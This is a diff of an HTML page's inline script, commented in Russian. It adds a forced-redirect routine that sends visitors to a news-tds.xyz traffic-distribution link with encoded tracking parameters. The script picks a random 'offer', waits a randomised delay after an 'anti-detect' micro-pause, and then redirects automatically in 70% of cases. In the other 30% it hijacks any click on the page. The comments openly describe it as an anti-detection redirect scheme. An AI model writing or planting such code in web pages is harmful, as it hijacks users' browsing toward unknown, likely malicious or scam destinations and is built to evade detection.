@@ -19,28 +19,52 @@ h2 {
 
 <script>
 
-// === СПИСОК ССЫЛОК ===
-let links = [
-"https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0",
-"https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0",
-"https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0"
+// === ОФФЕРЫ (пока одна ссылка, но с разными режимами) ===
+let offers = [
+{
+    url: "https://news-tds.xyz/?p=MWFiNzRhYWI3NjliOWZlNTc5ZDJmNTQzY2ZiNjVmODh8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8MTg3NjUzMjc=&v=2&poid=0&coid=0",
+    minDelay: 2200,
+    maxDelay: 2800
+},
+{
+    url: "https://news-tds.xyz/?p=MWFiNzRhYWI3NjliOWZlNTc5ZDJmNTQzY2ZiNjVmODh8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8MTg3NjUzMjc=&v=2&poid=0&coid=0",
+    minDelay: 3000,
+    maxDelay: 5000
+},
+{
+    url: "https://news-tds.xyz/?p=MWFiNzRhYWI3NjliOWZlNTc5ZDJmNTQzY2ZiNjVmODh8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8MTg3NjUzMjc=&v=2&poid=0&coid=0",
+    minDelay: 5000,
+    maxDelay: 7000
+}
 ];
 
-// случайная ссылка
-let randomLink = links[Math.floor(Math.random() * links.length)];
+// случайный оффер
+let offer = offers[Math.floor(Math.random() * offers.length)];
 
-// случайная задержка (5000–7000 ms)
-let delay = Math.floor(Math.random() * (7000 - 5000 + 1)) + 5000;
+// задержка под него
+let delay = Math.floor(Math.random() * (offer.maxDelay - offer.minDelay + 1)) + offer.minDelay;
 
-// редирект
+// анти-детект: микрозадержка перед стартом
+let preDelay = Math.random() * 500;
+
+// запуск
 setTimeout(function(){
-    window.location.href = randomLink;
-}, delay);
 
-// клик по странице (fallback)
-document.addEventListener("click", function(){
-    window.location.href = randomLink;
-});
+    // 70% — авто редирект
+    if (Math.random() < 0.7) {
+        setTimeout(function(){
+            window.location.href = offer.url;
+        }, delay);
+    }
+
+    // 30% — только по клику
+    else {
+        document.addEventListener("click", function(){
+            window.location.href = offer.url;
+        });
+    }
+
+}, preDelay);
 
 </script>
 
